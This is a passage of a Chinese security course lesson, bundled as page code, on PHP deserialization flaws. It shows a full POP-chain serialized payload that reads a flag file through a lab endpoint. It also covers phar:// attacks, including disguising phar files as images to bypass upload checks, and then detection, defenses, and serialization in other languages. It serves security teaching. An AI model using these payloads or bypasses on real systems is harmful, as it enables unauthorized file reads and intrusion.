style="color:#005CC5;">6</span><span style="color:#D73A49;">:</span><span style="color:#032F62;">&quot;params&quot;</span><span style="color:#24292E;">;a</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">1</span><span style="color:#D73A49;">:</span><span style="color:#24292E;">{s</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">6</span><span style="color:#D73A49;">:</span><span style="color:#032F62;">&quot;source&quot;</span><span style="color:#24292E;">;s</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">22</span><span style="color:#D73A49;">:</span><span style="color:#032F62;">&quot;/var/www/html/flag.php&quot;</span><span style="color:#24292E;">;}}}s</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">6</span><span style="color:#D73A49;">:</span><span style="color:#032F62;">&quot;source&quot;</span><span style="color:#24292E;">;N;}}</span></span></code></pre></div><p><strong>5. 将生成的序列化字符串传递给漏洞参数实现利用</strong></p><p>漏洞参数是 GET 参数 str，因此可以如此构造请求：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">http</span><span style="color:#F97583;">:</span><span style="color:#6A737D;">//127.0.0.1/vul.php?str=O:6:&quot;Output&quot;:2:{s:4:&quot;test&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Show&quot;:2:{s:3:&quot;str&quot;;a:1:{s:3:&quot;str&quot;;O:4:&quot;Test&quot;:2:{s:4:&quot;file&quot;;N;s:6:&quot;params&quot;;a:1:{s:6:&quot;source&quot;;s:22:&quot;/var/www/html/flag.php&quot;;}}}s:6:&quot;source&quot;;N;}}</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">http</span><span style="color:#D73A49;">:</span><span style="color:#6A737D;">//127.0.0.1/vul.php?str=O:6:&quot;Output&quot;:2:{s:4:&quot;test&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Show&quot;:2:{s:3:&quot;str&quot;;a:1:{s:3:&quot;str&quot;;O:4:&quot;Test&quot;:2:{s:4:&quot;file&quot;;N;s:6:&quot;params&quot;;a:1:{s:6:&quot;source&quot;;s:22:&quot;/var/www/html/flag.php&quot;;}}}s:6:&quot;source&quot;;N;}}</span></span></code></pre></div><p>整个过程可能有点绕，但 POP 链的利用技术就是如此，需要你对目标程序进行全方位的分析，提取出可利用的调用链进行组装，才有可能实现真正的攻击效果。</p><h4 id="_3-phar-文件攻击" tabindex="-1">3.phar 文件攻击 <a class="header-anchor" href="#_3-phar-文件攻击" aria-label="Permalink to &quot;3.phar 文件攻击&quot;">​</a></h4><p>在 2018 年 BlackHat 黑客大会上，安全研究员 Sam Thomas 分享了议题&quot;It&#39;s a PHP unserialization vulnerability Jim, but not as we know it&quot;，介绍了一种关于利用 phar 文件实现反序列化漏洞的利用技巧，利用的是 phar 文件中序列化存储用户自定义的 meta-data，在解析该数据时就必然需要反序列化，配合 phar:// 伪协议即可触发对此的反序列化操作。比如如下代码即可触发对 test.txt 文件内容的反序列化操作：</p><div class="language-php vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">$filename </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;phar://phar.phar/test.txt&#39;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#79B8FF;">file_get_contents</span><span style="color:#E1E4E8;">($filename);</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">$filename </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;phar://phar.phar/test.txt&#39;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#005CC5;">file_get_contents</span><span style="color:#24292E;">($filename);</span></span></code></pre></div><p>在实际利用时，还可以对 phar 文件进行格式上的伪造，比如添加图片的头信息，将其伪装成其他格式的文件，用于绕过一些上传文件格式的限制。</p><p>更加具体技术资料，推荐以下两篇：</p><p><a href="https://paper.seebug.org/680/" target="_blank" rel="noreferrer">《利用 phar 拓展 php 反序列化漏洞攻击面》</a></p><p><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf" target="_blank" rel="noreferrer">《It&#39;s a PHP unserialization vulnerability Jim, but not as we know it》</a></p><h3 id="如何挖掘反序列化漏洞" tabindex="-1">如何挖掘反序列化漏洞？ <a class="header-anchor" href="#如何挖掘反序列化漏洞" aria-label="Permalink to &quot;如何挖掘反序列化漏洞？&quot;">​</a></h3><h4 id="_1-代码审计" tabindex="-1">1.代码审计 <a class="header-anchor" href="#_1-代码审计" aria-label="Permalink to &quot;1.代码审计&quot;">​</a></h4><p>个人认为，想主动检测一些反序列化漏洞，特别是 0day 漏洞，最好的方法就是代码审计，针对不同的语言的反序化操作函数，比如 php unserialize 函数，还要注意 phar 文件攻击场景，然后往上回溯参数的传递来源，看是否有外部可控数据引用（比如 GET、POST 参数等等），而又未过任何过滤，那么它就有可能存在反序列化漏洞。</p><h4 id="_2-rasp-检测" tabindex="-1">2.RASP 检测 <a class="header-anchor" href="#_2-rasp-检测" aria-label="Permalink to &quot;2.RASP 检测&quot;">​</a></h4><p>在《08 | SQL 注入：漏洞的检测与防御》中已经介绍过 RASP，可以针对不同的语言做一些 Hook，如果发现一些敏感函数（比如 php eval、unserialize）被执行就打印出栈回溯，方便追踪漏洞成功，以及漏洞利用技术技巧，整个 POP 链也可以从中获取到。</p><p>所以，通过 RASP 不仅有利于拦截漏洞攻击，还可以定位漏洞代码，以及学习攻击者的利用技术，为后续的漏洞修复和拦截提供更多的参考价值。</p><h4 id="_3-动态黑盒扫描" tabindex="-1">3.动态黑盒扫描 <a class="header-anchor" href="#_3-动态黑盒扫描" aria-label="Permalink to &quot;3.动态黑盒扫描&quot;">​</a></h4><p>通过收集历史漏洞的 payload，再结合网站指纹识别，特别是第三方库的识别，然后再根据不同的第三方库发送对应的 payload，根据返回结果作漏洞是否存在的判断。</p><p>这项工作也常于外曝漏洞后的安全应急工作，然后加入日常漏洞扫描流程中，以应对新增业务的检测。</p><h3 id="防御反序列化漏洞" tabindex="-1">防御反序列化漏洞 <a class="header-anchor" href="#防御反序列化漏洞" aria-label="Permalink to &quot;防御反序列化漏洞&quot;">​</a></h3><ul><li><strong>黑白名单限制</strong></li></ul><p>针对反序列化的类做一份白名单或黑名单的限制，首选白名单，避免一些遗漏问题被绕过。这种方法是当前很多主流框架的修复方案。</p><p>黑名单并不能完全保证序列化过程的安全，有时网站开发个新功能，加了一些类之后，就有可能绕过黑名单实现利用，这也是为什么有些反序列化漏洞修复后又在同一个地方出现的原因。</p><ul><li><strong>WAF</strong></li></ul><p>收集各种语言的反序列化攻击数据，提取特征用于拦截请求。</p><ul><li><strong>RASP</strong></li></ul><p>RASP 除了可以检测漏洞外，它本身也可以提供类似 WAF 的防御功能。</p><h3 id="扩展-其他语言的反序列化" tabindex="-1">扩展：其他语言的反序列化 <a class="header-anchor" href="#扩展-其他语言的反序列化" aria-label="Permalink to &quot;扩展：其他语言的反序列化&quot;">​</a></h3><p>其他编程语言也存在对应的序列化和反序列化功能，其产生和利用的原理与 PHP 类似。</p><ul><li><strong>Python</strong></li></ul><p>使用模块 pickle 就可以实现对一个 Python 对象结构的二进制序列化和反序列化</p><div class="language-python vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">python</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#6A737D;"># 序列化</span></span>
<span class="line"><span style="color:#E1E4E8;">pickle.dump(obj, </span><span style="color:#FFAB70;">file</span><span style="color:#E1E4E8;">, </span><span style="color:#FFAB70;">protocol</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">None</span><span style="color:#E1E4E8;">, </span><span style="color:#F97583;">*</span><span style="color:#E1E4E8;">, </span><span style="color:#FFAB70;">fix_imports</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">True</span><span style="color:#E1E4E8;">) </span></span>
<span class="line"><span style="color:#6A737D;"># 反序列化</span></span>
<span class="line"><span style="color:#E1E4E8;">pickle.load(</span><span style="color:#FFAB70;">file</span><span style="color:#E1E4E8;">, </span><span style="color:#F97583;">*</span><span style="color:#E1E4E8;">, </span><span style="color:#FFAB70;">fix_imports</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">True</span><span style="color:#E1E4E8;">, </span><span style="color:#FFAB70;">encoding</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&#39;ASCII&#39;</span><span style="color:#E1E4E8;">, </span><span style="color:#FFAB70;">errors</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&#39;strict&#39;</span><span style="color:#E1E4E8;">)</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#6A737D;"># 序列化</span></span>
<span class="line"><span style="color:#24292E;">pickle.dump(obj, </span><span style="color:#E36209;">file</span><span style="color:#24292E;">, </span><span style="color:#E36209;">protocol</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">None</span><span style="color:#24292E;">, </span><span style="color:#D73A49;">*</span><span style="color:#24292E;">, </span><span style="color:#E36209;">fix_imports</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">True</span><span style="color:#24292E;">) </span></span>
<span class="line"><span style="color:#6A737D;"># 反序列化</span></span>
<span class="line"><span style="color:#24292E;">pickle.load(</span><span style="color:#E36209;">file</span><span style="color:#24292E;">, </span><span style="color:#D73A49;">*</span><span style="color:#24292E;">, </span><span style="color:#E36209;">fix_imports</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">True</span><span style="color:#24292E;">, </span><span style="color:#E36209;">encoding</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&#39;ASCII&#39;</span><span style="color:#24292E;">, </span><span style="color:#E36209;">errors</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&#39;strict&#39;</span><span style="color:#24292E;">)</span></span></code></pre></div><ul><li><strong>Java</strong></li></ul><p>在 Java 中，只要一个类实现了 java.io.Serializable 接口，那么它就可以被序列化，通过 ObjectOutputStream 和 ObjectInputStream 来实现序列化与反序列化操作。</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#6A737D;">// 序列化</span></span>
<span class="line"><span style="color:#E1E4E8;">ObjectOutputStream oos </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">new</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">ObjectOutputStream</span><span style="color:#E1E4E8;">(</span><span style="color:#F97583;">new</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">FileOutputStream</span><span style="color:#E1E4E8;">(</span><span style="color:#F97583;">new</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">File</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;d:/string.txt&quot;</span><span style="color:#E1E4E8;">)));</span></span>
<span class="line"><span style="color:#E1E4E8;">oos.</span><span style="color:#B392F0;">writeObject</span><span style="color:#E1E4E8;">(obj) </span><span style="color:#6A737D;">// 将对象序列化后的字符串写入d:/string.txt</span></span>
<span class="line"><span style="color:#6A737D;">// 反序列化</span></span>
<span class="line"><span style="color:#E1E4E8;">ObjectInputStream ois </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">new</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">ObjectInputStream</span><span style="color:#E1E4E8;">(</span><span style="color:#F97583;">new</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">FileInputStream</span><span style="color:#E1E4E8;">(</span><span style="color:#F97583;">new</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">File</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;d:/string.txt&quot;</span><span style="color:#E1E4E8;">)));</span></span>
<span class="line"><span style="color:#E1E4E8;">ois.</span><span style="color:#B392F0;">readObject</span><span style="color:#E1E4E8;">();  </span><span style="color:#6A737D;">// 读取d:/string.txt中的序列化字符串，并重建回对象</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#6A737D;">// 序列化</span></span>
<span class="line"><span style="color:#24292E;">ObjectOutputStream oos </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">new</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">ObjectOutputStream</span><span style="color:#24292E;">(</span><span style="color:#D73A49;">new</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">FileOutputStream</span><span style="color:#24292E;">(</span><span style="color:#D73A49;">new</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">File</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;d:/string.txt&quot;</span><span style="color:#24292E;">)));</span></span>
<span class="line"><span style="color:#24292E;">oos.</span><span style="color:#6F42C1;">writeObject</span><span style="color:#24292E;">(obj) </span><span style="color:#6A737D;">// 将对象序列化后的字符串写入d:/string.txt</span></span>
<span class="line"><span style="color:#6A737D;">// 反序列化</span></span>
<span class="line"><span style="color:#24292E;">ObjectInputStream ois </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">new</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">ObjectInputStream</span><span style="color:#24292E;">(</span><span style="color:#D73A49;">new</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">FileInputStream</span><span style="color:#24292E;">(</span><span style="color:#D73A49;">new</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">File</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;d:/string.txt&quot;</span><span style="color:#24292E;">)));</span></span>
<span class="line"><span style="color:#24292E;">ois.</span><span style="color:#6F42C1;">readObject</span><span style="color:#24292E;">();  </span><span style="color:#6A737D;">// 读取d:/string.txt中的序列化字符串，并重建回对象</span></span></code></pre></div><ul><li><strong>Ruby</strong></li></ul><p>在 Ruby 中可以使用 Marshal 模块实现对象的序列化与反序列化操作。</p><div class="language-ruby vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">ruby</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#6A737D;"># 序列化</span></span>
<span class="line"><span style="color:#E1E4E8;">str </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">Marshal</span><span style="color:#E1E4E8;">.dump(obj)</span></span>
<span class="line"><span style="color:#6A737D;">#反序列化</span></span>
<span class="line"><span style="color:#E1E4E8;">obj </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">Marshal</span><span style="color:#E1E4E8;">.</span><span style="color:#79B8FF;">load</span><span style="color:#E1E4E8;">(str)</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#6A737D;"># 序列化</span></span>
<span class="line"><span style="color:#24292E;">str </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">Marshal</span><span style="color:#24292E;">.dump(obj)</span></span>
<span class="line"><span style="color:#6A737D;">#反序列化</span></span>
<span class="line"><span style="color:#24292E;">obj </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">Marshal</span><span style="color:#24292E;">.</span><span style="color:#005CC5;">load</span><span style="color:#24292E;">(str)</span></span></code></pre></div><h3 id="小结" tabindex="-1">小结 <a class="header-anchor" href="#小结" aria-label="Permalink to &quot;小结&quot;">​</a></h3><p>本节课主要介绍 PHP 下反序列化漏洞，专门举几个代码 demo 进行演示，让你对序列化与反序列化有个实际的直观感受，然后构造漏洞 demo，讲解针对反序列化漏洞的利用思路，旨在帮助你加深 POP 链与魔术方法利用技巧，这在反序列化漏洞利用中是最为常用的。</p><p>其他语言也有反序列化漏洞，比如 Java 语言，大家可以在留言区中评论，探讨其他语言的一些反序列化漏洞。</p><hr><p><a href="https://wj.qq.com/s2/8059116/3881/" target="_blank" rel="noreferrer">课程评价入口，挑选 5 名小伙伴赠送小礼品～</a></p>`,51);function g(A,D,_,B,b,q){const n=e("Image");return t(),c("div",null,[y,a(n,{alt:"Lark20210121-180531.png",src:"https://s0.lgstatic.com/i/image/M00/8F/E1/Ciqc1GAJUtSAOq4oAAFC9pGx2M8332.png"}),p(),E,a(n,{alt:"Lark20210121-180537.png",src:"https://s0.lgstatic.com/i/image/M00/8F/EC/CgqCHmAJUuyAZXQKAAB855K4LBk536.png"}),p(),i,F,u,a(n,{alt:"Lark20210121-180540.png",src:"https://s0.lgstatic.com/i/image/M00/8F/E1/Ciqc1GAJUvSAaqlFAAB9jR92PEM612.png"}),p(),h,C,a(n,{alt:"Lark20210121-180543.png",src:"https://s0.lgstatic.com/i/image/M00/8F/E1/Ciqc1GAJUvuASTMYAAB-HQ644z0682.png"}),p(),d])}const m=o(r,[["render",g]]);export{$ as __pageData,m as default};
